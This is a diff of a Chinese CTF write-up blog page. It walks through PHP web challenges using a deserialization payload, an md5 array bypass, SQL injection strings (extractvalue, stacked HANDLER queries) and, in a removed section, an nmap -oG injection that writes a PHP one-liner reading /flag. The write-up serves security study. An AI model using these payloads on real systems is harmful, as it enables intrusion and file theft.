 <p>回答1：对比write()与read()</p>
-<pre><code> private function write() {
-        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
-            if(strlen((string)$this-&gt;content) &gt; 100) {
-                $this-&gt;output(&quot;Too long!&quot;);
-                die();
-            }
-            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
-            if($res) $this-&gt;output(&quot;Successful!&quot;);
-            else $this-&gt;output(&quot;Failed!&quot;);
-        } else {
-            $this-&gt;output(&quot;Failed!&quot;);
-        }
-    }</code></pre><p>首先需要设置成员filename和content，然后判断content不能的字符串不能大于100，然后再将content的内容写入到我传入的filename的文件中，然后通过判断res的类型来执行output方法，但是如果按照这个逻辑的话，那么flag这辈子是出不来了，得到的结果要么successful，要么是failed，所以不可能是通过write方法了</p>
+<pre class="line-numbers language-php"><code class="language-php"> <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先需要设置成员filename和content，然后判断content不能的字符串不能大于100，然后再将content的内容写入到我传入的filename的文件中，然后通过判断res的类型来执行output方法，但是如果按照这个逻辑的话，那么flag这辈子是出不来了，得到的结果要么successful，要么是failed，所以不可能是通过write方法了</p>
 <p>问题2：那么如何调用read()方法呢？</p>
 <p>回答2：利用可以调用的__destruct()来实现read()方法的调用</p>
-<pre><code> function __destruct() {
-        if($this-&gt;op === &quot;2&quot;)
-            $this-&gt;op = &quot;1&quot;;
-        $this-&gt;content = &quot;&quot;;
-        $this-&gt;process();
-    }</code></pre><p>===很扎眼，考点为弱类型，如果op=一个字符型的2那么就把2变成1，然后调用process()方法：</p>
-<pre><code>public function process() {
-        if($this-&gt;op == &quot;1&quot;) {
-            $this-&gt;write();
-        } else if($this-&gt;op == &quot;2&quot;) {
-            $res = $this-&gt;read();
-            $this-&gt;output($res);
-        } else {
-            $this-&gt;output(&quot;Bad Hacker!&quot;);
-        }
-    }</code></pre><p>首先在刚才就被我们否定的write()函数，是绝对不能用的，所以op绝对不可以=1，所以想要保住op=2的前提下又绕过__destruct()函数，就要使用弱类型来实现，也就是说：</p>
+<pre class="line-numbers language-php"><code class="language-php"> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>===很扎眼，考点为弱类型，如果op=一个字符型的2那么就把2变成1，然后调用process()方法：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先在刚才就被我们否定的write()函数，是绝对不能用的，所以op绝对不可以=1，所以想要保住op=2的前提下又绕过__destruct()函数，就要使用弱类型来实现，也就是说：</p>
 <p>if($this-&gt;op == “2”) 这里的2可是整数型，可以是字符型，都返回true</p>
 <p>if($this-&gt;op === “2”) 这里的2如果是整数型则返回false，只有字符型的时候才返回true</p>
 <p>这样就可以给$op传入整数型2的值来实现即绕过了__destruct()函数，又能保证执行read()方法</p>
-<pre><code>private function read() {
-        $res = &quot;&quot;;
-        if(isset($this-&gt;filename)) {
-            $res = file_get_contents($this-&gt;filename);
-        }
-        return $res;
-    }</code></pre><p>最后一个考点就是在遇到这个file_get_contents()函数的时候，结合php://filter/read=convert.base64-encode/resource=flag.php,等各种伪协议绕过姿势(我没有试)</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最后一个考点就是在遇到这个file_get_contents()函数的时候，结合php://filter/read=convert.base64-encode/resource=flag.php,等各种伪协议绕过姿势(我没有试)</p>
 <p>然后可以本地环境来实验了：</p>
-<pre><code>&lt;?php
-class FileHandler {
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>
 
-    public $op = 2;
-    public $filename = &quot;flag.php&quot;;
-    public $content;
+    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
 
-    }
-$a = new FileHandler();
-echo serialize($a);
-?&gt;</code></pre><p>构造payload：</p>
+    <span class="token punctuation">}</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>构造payload：</p>
 <pre><code>?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;}</code></pre><p>右键查看源代码得到flag</p>
 <h1 id="2021-4-27"><a href="#2021-4-27" class="headerlink" title="2021-4-27"></a>2021-4-27</h1><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>题目源代码</p>
-<pre><code>&lt;?php
-include &#39;flag.php&#39;;
-$flag=&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;;
-if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) {
-    $id=$_GET[&#39;id&#39;];
-    $gg=$_GET[&#39;gg&#39;];
-    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
-        echo &#39;You got the first step&#39;;
-        if(isset($_POST[&#39;passwd&#39;])) {
-            $passwd=$_POST[&#39;passwd&#39;];
-            if (!is_numeric($passwd))
-            {
-                 if($passwd==1234567)
-                 {
-                     echo &#39;Good Job!&#39;;
-                     highlight_file(&#39;flag.php&#39;);
-                     die(&#39;By Retr_0&#39;);
-                 }
-                 else
-                 {
-                     echo &quot;can you think twice??&quot;;
-                 }
-            }
-            else{
-                echo &#39;You can not get it !&#39;;
-            }
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$gg</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'You got the first step'</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token operator">==</span><span class="token number">1234567</span><span class="token punctuation">)</span>
+                 <span class="token punctuation">{</span>
+                     <span class="token keyword">echo</span> <span class="token string">'Good Job!'</span><span class="token punctuation">;</span>
+                     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'By Retr_0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                 <span class="token punctuation">}</span>
+                 <span class="token keyword">else</span>
+                 <span class="token punctuation">{</span>
+                     <span class="token keyword">echo</span> <span class="token string">"can you think twice??"</span><span class="token punctuation">;</span>
+                 <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">else</span><span class="token punctuation">{</span>
+                <span class="token keyword">echo</span> <span class="token string">'You can not get it !'</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
 
-        }
-        else{
-            die(&#39;only one way to get the flag&#39;);
-        }
-}
-    else {
-        echo &quot;You are not a real hacker!&quot;;
-    }
-}
-else{
-    die(&#39;Please input first&#39;);
-}
-}
-?&gt;</code></pre><p>第一步绕过：</p>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span><span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'only one way to get the flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+    <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"You are not a real hacker!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Please input first'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>第一步绕过：</p>
 <pre><code> if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) </code></pre><p>利用数组绕过：</p>
 <pre><code>?gg[]=1&amp;id[]=2</code></pre><p>第二步绕过：</p>
 <pre><code>if (!is_numeric($passwd))
@@ -2124,44 +2136,6 @@ else{
 <pre><code>-1&#39; or extractvalue(1,concat(&#39;~&#39;,database()))#</code></pre><p>新考点学习：<a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">mysql中的HANDLER … OPEN语句</a></p>
 <p>payload：</p>
 <pre><code>1&#39;;use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</code></pre><p>得到flag</p>
-<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><pre><code>&lt;?php
-
-if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
-    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
-}
-
-if(!isset($_GET[&#39;host&#39;])) {
-    highlight_file(__FILE__);
-} else {
-    $host = $_GET[&#39;host&#39;];
-    $host = escapeshellarg($host);
-    $host = escapeshellcmd($host);
-    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);
-    echo &#39;you are in sandbox &#39;.$sandbox;
-    @mkdir($sandbox);
-    chdir($sandbox);
-    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
-}</code></pre><h3 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h3><h4 id="escapeshellarg函数："><a href="#escapeshellarg函数：" class="headerlink" title="escapeshellarg函数："></a>escapeshellarg函数：</h4><p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7, PHP 8)</p>
-<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数；</p>
-<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行运算符</a> 。</p>
-<p>例子：</p>
-<pre><code>&lt;?php
-system(&#39;ls &#39;.escapeshellarg($dir));
-?&gt;</code></pre><h3 id="escapeshellcmd函数："><a href="#escapeshellcmd函数：" class="headerlink" title="escapeshellcmd函数："></a>escapeshellcmd函数：</h3><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
-<p>escapeshellcmd — shell 元字符转义</p>
-<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行操作符</a> 之前进行转义。</p>
-<p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。</p>
-<h4 id="利用-绕过-PHP-escapeshellarg-escapeshellcmd函数："><a href="#利用-绕过-PHP-escapeshellarg-escapeshellcmd函数：" class="headerlink" title="利用/绕过 PHP escapeshellarg/escapeshellcmd函数："></a><a href="https://zhuanlan.zhihu.com/p/36602107" target="_blank" rel="noopener">利用/绕过 PHP escapeshellarg/escapeshellcmd函数：</a></h4><p>escapeshellarg和escapeshellcmd的功能<br>escapeshellarg<br>1.确保用户只传递一个参数给命令<br>2.用户不能指定更多的参数一个<br>3.用户不能执行不同的命令</p>
-<p>escapeshellcmd<br>1.确保用户只执行一个命令<br>2.用户可以指定不限数量的参数<br>3.用户不能执行不同的命令</p>
-<h4 id="chdir-函数："><a href="#chdir-函数：" class="headerlink" title="chdir()函数："></a>chdir()函数：</h4><p>新建一个目录</p>
-<h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h3><p>首先请求头里面要有X_FORWARDED_FOR，有的话会被变成REMOTE_ADDR</p>
-<p>get传入参数host，这里用该就是传入ip</p>
-<p>看了看<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a>(一个很强的技术站点)</p>
-<p>然后配合这篇文章才能完全理解哈：</p>
-<p><a href="http://www.lmxspace.com/2018/07/16/谈谈escapeshellarg参数绕过和注入的问题/" target="_blank" rel="noopener">谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com)</a></p>
-<p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
-<p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了,或者直接查看flag</p>
-<pre><code>?host=&#39; &lt;?echo `cat /flag`;?&gt; -oG hack.php &#39;</code></pre><p>执行后会返回文件夹名</p>
 <h1 id="2021-04-29"><a href="#2021-04-29" class="headerlink" title="2021-04-29"></a>2021-04-29</h1><p>蓝帽杯</p>
 <h1 id="2021-04-30"><a href="#2021-04-30" class="headerlink" title="2021-04-30"></a>2021-04-30</h1><p>转战ctfhub</p>
 
@@ -2890,7 +2864,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">79.2k</span> 字
+                <span class="white-color">79.7k</span> 字
             
 
             
